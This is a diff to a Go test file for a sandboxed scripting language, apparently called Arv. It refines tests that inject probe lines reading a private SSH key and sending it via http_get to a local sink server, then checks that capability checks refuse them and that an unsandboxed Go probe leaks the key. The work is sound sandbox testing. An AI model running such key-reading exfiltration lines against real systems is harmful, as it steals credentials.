@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"testing"
 	"time"
@@ -67,15 +68,18 @@ func TestArvProbesAreDenied(t *testing.T) {
 		}
 		caps = append(caps, grant)
 	}
-	for name, line := range map[string]string{
-		"read and send": `http_get("` + ssrv.URL + `/sink?key=" + read_file("` + key + `"));`,
-		"send only":     `http_get("` + ssrv.URL + `/sink?key=stolen");`,
+	// Each probe names the capability that must refuse it: the read of
+	// the key is refused by fs_read, before any send, so the key never
+	// reaches Arv; a send alone is refused by net.
+	for name, probe := range map[string]struct{ line, denied string }{
+		"read and send": {`http_get("` + ssrv.URL + `/sink?key=" + read_file("` + key + `"));`, `capability denied: fs_read("`},
+		"send only":     {`http_get("` + ssrv.URL + `/sink?key=stolen");`, `capability denied: net("` + strings.TrimPrefix(ssrv.URL, "http://") + `")`},
 	} {
-		probe := insertAfter(t, string(src), "let urls =", line)
-		_, err := arv.Run(probe, arv.Options{Caps: caps})
+		src := insertAfter(t, string(src), "let urls =", probe.line)
+		_, err := arv.Run(src, arv.Options{Caps: caps})
 		var ae *arv.Error
-		if !errors.As(err, &ae) || ae.Kind != "capability" || !strings.HasPrefix(ae.Msg, "capability denied: ") {
-			t.Errorf("%s: %v, want a capability denial", name, err)
+		if !errors.As(err, &ae) || ae.Kind != "capability" || !strings.HasPrefix(ae.Msg, probe.denied) || name == "read and send" && !strings.Contains(ae.Msg, `/.ssh/id_ed25519")`) {
+			t.Errorf("%s: %v, want %s", name, err, probe.denied)
 		}
 		if err != nil && strings.Contains(err.Error(), canary) {
 			t.Errorf("%s: the error carries the key: %v", name, err)
@@ -95,8 +99,13 @@ func TestProbeScript(t *testing.T) {
 	out := t.TempDir()
 	cmd := exec.Command("bash", "probe.sh")
 	cmd.Env = append(os.Environ(), "BENCH_OUT="+out)
-	if b, err := cmd.CombinedOutput(); err != nil {
+	b, err := cmd.CombinedOutput()
+	if err != nil {
 		t.Fatalf("probe.sh: %v\n%s", err, b)
+	}
+	m := regexp.MustCompile(`canary: (\d+) bytes`).FindSubmatch(b)
+	if m == nil {
+		t.Fatalf("probe.sh printed no canary length:\n%s", b)
 	}
 	summary, err := os.ReadFile(filepath.Join(out, "escape", "summary.txt"))
 	if err != nil {
@@ -105,10 +114,22 @@ func TestProbeScript(t *testing.T) {
 	for _, want := range []string{
 		"arv-read-and-send: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0",
 		"arv-send-only: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0",
-		"go-read-and-send: exit 1, capability denied: no, sink requests: 1,",
+		// The Go probe delivers the whole key.
+		"go-read-and-send: exit 1, capability denied: no, sink requests: 1, sink bytes: " + string(m[1]) + "\n",
 	} {
 		if !strings.Contains(string(summary), want) {
 			t.Errorf("summary lacks %q:\n%s", want, summary)
+		}
+	}
+	// Which capability refused each Arv probe: fs_read refuses the read
+	// of the key before anything is sent, net the send alone.
+	for name, want := range map[string]string{
+		"arv-read-and-send": `capability denied: fs_read("` + filepath.Join(out, "escape", "home", ".ssh", "id_ed25519") + `")`, // the path as the probe wrote it
+		"arv-send-only":     `capability denied: net("127.0.0.1:`,
+	} {
+		stderr, _ := os.ReadFile(filepath.Join(out, "escape", name+".stderr"))
+		if !strings.Contains(string(stderr), want) {
+			t.Errorf("%s: stderr lacks %q:\n%s", name, want, stderr)
 		}
 	}
 	for probe, orig := range map[string]string{
